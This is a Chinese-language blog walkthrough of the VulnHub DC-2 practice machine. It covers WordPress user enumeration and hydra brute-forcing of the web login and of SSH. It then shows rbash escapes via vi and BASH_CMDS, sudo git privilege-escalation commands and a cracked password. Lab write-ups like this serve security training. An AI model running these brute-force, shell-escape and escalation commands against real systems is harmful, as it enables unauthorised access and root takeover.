---
title: VulnHub-DC2(二)
abbrlink: 11112
date: 2020-10-31 14:06:42
categories: [VulnHub]
---
### 前言
　　靶机名称:DC:2　　靶机难度:入门　　靶机ip:10.16.122.1　　下载地址:https://www.vulnhub.com/entry/dc-2,311/
<!-- more -->
### 信息搜集
　　输入ip地址后，出现如图情况
　　<img src="https://s1.ax1x.com/2020/10/31/BUhF3V.png">
　　host文件添加对应dns解析即可
　　<img src="https://s1.ax1x.com/2020/10/31/BUhDv8.png">
　　拉倒底部后，发现是wordpress框架
　　<img src="https://s1.ax1x.com/2020/10/31/BUh42V.png">
　　这里可以使用nmap漏洞扫描功能，也可以使用wpscan，然而kali自带的wpscan太老了已经没法更新了，需要手动去下载，还要申请api token才能使用。这里我选择使用nmap
　　nmap -sV -A --script=vuln 10.16.122.1 发现后台地址和用户名，但是这里并没有扫出wordpress版本，有时能扫出。
　　<img src="https://s1.ax1x.com/2020/10/31/BULps1.png">
　　也可以用审查元素查看版本
　　<img src="https://s1.ax1x.com/2020/10/31/BULztS.png">
　　搜索后并没有发现有4.7.10的exp，但找到了路径`/index.php/wp-json/wp/v2/users`下存在信息泄露
　　<img src="https://s1.ax1x.com/2020/10/31/BUO29g.png">
　　使用json格式化后，得到了两个用户admin和jerry，也是nmap已扫到的
　　<img src="https://s1.ax1x.com/2020/10/31/BUXvRg.png">

### flag1
　　在主页出直接显示了flag1，提示用cewl命令
　　<img src="https://s1.ax1x.com/2020/10/31/BUjZz4.png">
　　`cewl http://dc-2 -w pwd.txt`将会在当前目录下生成抓取的密码文件
　　<img src="https://s1.ax1x.com/2020/10/31/BUvZAP.png">
　　然后在新建一个user.txt，将前面nmap扫出的admin，tom，jerry用户写进去
　　<img src="https://s1.ax1x.com/2020/10/31/BUvU9U.png">
　　nmap哪里已经扫出了后台地址http://<span>dc-2/wp-login.php</span>
　　<img src="https://s1.ax1x.com/2020/10/31/BUvH4f.png">
　　接下来使用大名鼎鼎的hydra吧
```bash
hydra -L user.txt -P pwd.txt dc-2 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:<strong>ERROR</strong>"
-s   指定端口
-vV  显示爆破细节
-f   找到正确的账密就停止爆破
```
　　成功爆破出tom和jerry，这里要使用jerry账号登陆，tom账号权限不够
　　<img src="https://s1.ax1x.com/2020/10/31/BapBRK.png">
### flag2
　　登陆进后，来到pages即可得到flag2
　　意思是如果在此界面无法利用，就换一条路
　　<img src="https://s1.ax1x.com/2020/10/31/Ba9f0J.png">
　　发布文章时，尝试上传图片马，提示没有权限
　　<img src="https://s1.ax1x.com/2020/10/31/BaCE7j.png">
　　卡了许久，完全没思路，后来看了其他大佬的教程，得知靶机开放了其他端口，可见信息搜集的重要性
　　`nmap -p1-65535 10.16.122.1`
　　<img src="https://s1.ax1x.com/2020/10/31/BaC6UA.png">
　　全端口扫描后得到开放了7744，发现其实是ssh服务
　　<img src="https://s1.ax1x.com/2020/10/31/BaPZrD.png">
　　接下来还是使用hydra爆破ssh
　　`hydra -L user.txt -P pwd.txt -s 7744 10.16.122.1 ssh`,你会发现tom的ssh的登陆密码和web登陆密码是一模一样的
　　<img src="https://s1.ax1x.com/2020/10/31/BaFknO.png">

### flag3
　　直接ls发现flag3
　　<img src="https://s1.ax1x.com/2020/10/31/BakpVg.png">
　　使用cat flag3.txt出现命令未找到
　　<img src="https://s1.ax1x.com/2020/10/31/BakXFJ.png">
　　发现是rbash简单点说，就是只能使用一部分命令，发现vi命令可以查看flag3
　　<img src="https://s1.ax1x.com/2020/10/31/BaAAFH.png">
　　这里也可以使用echo+vi查看文件和文件夹，这样也得到了flag4
　　<img src="https://s1.ax1x.com/2020/10/31/BaE99s.png">
　　继续上面的flag3，提示用jerry用户登陆，那么现在就要绕过rbash
　　网上找了很多vi命令的绕过，都写的云里雾里的，这里给出详细过程
　　1.vi 绕过
```bash
vi
:set shell=/bin/bash
:shell
export PATH=$PATH:/bin/
export PATH=$PATH:/usr/bin
```
　　进入vi命令行模式后，输入后:set shell=/bin/bash回车
　　<img src="https://s1.ax1x.com/2020/10/31/BaVqw8.png">
　　这里光标会跑到第一行，不用管它
　　<img src="https://s1.ax1x.com/2020/10/31/BaeQvn.png" height="50%">
　　继续进入命令行，输入:shell，回车后，会得到一个shell
　　<img src="https://s1.ax1x.com/2020/10/31/BatpcV.png">
　　<img src="https://s1.ax1x.com/2020/10/31/BamQiD.png">
　　咋一看跟原来的一模一样，不急依次输入
　　export PATH=$PATH:/bin/
　　export PATH=$PATH:/usr/bin
　　这两条命令后，已经绕过了rbash了，并且成功使用cat命令
　　<img src="https://s1.ax1x.com/2020/10/31/BamjYD.png">

　　2.BASH_CMDS[a]=/bin/sh;a 绕过

```bash
BASH_CMDS[a]=/bin/sh;a
export PATH=$PATH:/bin/
export PATH=$PATH:/usr/bin
```
　　<img src="https://s1.ax1x.com/2020/10/31/Ban8tU.png">

### flag4
　　接下来就切换到jerry用户，而tom的ssh密码和web登陆是一样的，所以这里的jerry的ssh密码可以尝试使用前面已经爆破出来的adipiscing
　　输入`su jerry` 密码:adipiscing，成功登陆后，查看到flag4
　　<img src="https://s1.ax1x.com/2020/10/31/BatDEQ.png">
　　提示用git提权到root
　　`sudo -l` 查询root权限，可看到/usr/bin/git是root权限执行，并且不需要密码
　　<img src="https://s1.ax1x.com/2020/10/31/Bat7CR.png">

### flag5
　　那么接下来就是提权了，git提权参考文章https://gtfobins.github.io/gtfobins/git/
　　1.第一种

```shell
sudo git help config
!/bin/bash
```
　　2.第二种
```shell
sudo git branch --help config
!/bin/bash
```
　　3.第三种
```shell
TF=$(mktemp -d)
ln -s /bin/sh "$TF/git-x"
sudo git "--exec-path=$TF" x
!/bin/bash
```
　　这里演示第一种，输入`sudo git help config`后，会强行分页显示
　　<img src="https://s1.ax1x.com/2020/10/31/BaNQx0.png">
　　继续输入`!/bin/bash`回车
　　<img src="https://s1.ax1x.com/2020/10/31/BaNBM6.png">
　　提权成功并在root目录下查看到最终flag
　　<img src="https://s1.ax1x.com/2020/10/31/BaNcIH.png">